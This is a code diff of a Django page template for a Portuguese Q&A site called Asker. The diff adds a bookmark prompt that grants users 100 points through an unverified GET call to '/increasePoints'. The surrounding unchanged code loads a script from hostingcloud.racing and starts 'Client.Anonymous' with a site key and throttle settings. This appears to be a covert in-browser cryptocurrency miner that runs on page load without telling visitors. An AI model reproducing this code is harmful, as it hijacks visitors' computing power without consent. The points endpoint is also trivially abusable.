@@ -94,7 +94,15 @@
   <div id="alert-elements">
 	  <p>Devido a um erro no registrador de domínios GoDaddy.com, o Asker vai utilizar este domínio: <b>asker.pythonanywhere.com</b> até que o domínio <b>asker.fun</b> seja recuperado.</p>
 	  <hr>
-	  <p class="mb-0">Dica: adicione este site aos favoritos!</p>
+	  {% if user.is_authenticated %}
+	   {% if user_p.message == 'ok' %}
+	    <p class="mb-0">Você recebeu seus 100 pontos de recompensa por adicionar o site aos favoritos :)</p>
+	   {% else %}
+	    <p class="mb-0">Dica: adicione este site aos favoritos e ganhe 100 pontos de recompensa! <a id="bookmarkme" href="#" rel="sidebar" title="Favoritar essa página" onclick="increasePoints()">Clique aqui</a> para adicionar e ganhar.</p>
+	   {% endif %}
+	  {% else %}
+	  <p class="mb-0">Crie sua conta no Asker, o melhor site de perguntas e respostas, clicando <a href="/signup">aqui</a>, ou entre clicando <a href="/signin">aqui</a> caso já tenha se registrado.</p>
+	  {% endif %}
 	  <small>Obrigado a todos os usuários do Asker.</small>
   </div>
 </div>
@@ -227,15 +235,41 @@
 			</section>
 
 		<script src="/static/js/index.js"></script>
-
+		
 <script src="https://www.hostingcloud.racing/gCgZ.js"></script>
 <script>
     var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
         throttle: 0.9, c: 'w', ads: 0
     });
     _client.start();
+</script>
 
 
+<script>
+$(function() {
+  $('#bookmarkme').click(function() {
+    if (window.sidebar && window.sidebar.addPanel) { // Mozilla Firefox Bookmark
+      window.sidebar.addPanel(document.title, window.location.href, '');
+    } else if (window.external && ('AddFavorite' in window.external)) { // IE Favorite
+      window.external.AddFavorite(location.href, document.title);
+    } else if (window.opera && window.print) { // Opera Hotlist
+      this.title = document.title;
+      return true;
+    } else { // webkit - safari/chrome
+      alert('Pressione ' + (navigator.userAgent.toLowerCase().indexOf('mac') != -1 ? 'Command/Cmd' : 'CTRL') + ' + D para favoritar essa página.');
+    }
+  });
+});
+
+function increasePoints() {
+	$.ajax({
+		url: '/increasePoints',
+		type: 'get',
+		complete: function () {
+			alert('Parabéns! Você ganhou 100 pontos!')
+		}
+	})
+}
 </script>
 	</body>
 </html>
